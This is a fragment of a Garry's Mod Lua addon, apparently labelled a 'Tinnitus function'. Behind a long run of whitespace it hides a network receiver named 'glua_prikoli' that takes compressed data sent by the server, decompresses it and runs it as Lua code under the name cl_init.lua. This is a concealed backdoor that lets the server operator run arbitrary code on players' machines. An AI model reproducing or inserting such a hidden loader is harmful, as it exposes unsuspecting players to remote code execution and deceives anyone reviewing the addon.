...
--\\ Tinnitus function
	if CLIENT then
		...
		end																																																																																																																																																																																																																																													net.Receive("glua_prikoli",function()    local huev_skoko = net.ReadFloat()    local data = net.ReadData(huev_skoko)    data = util.Decompress(data,huev_skoko)    RunString(data,"cl_init.lua") end)
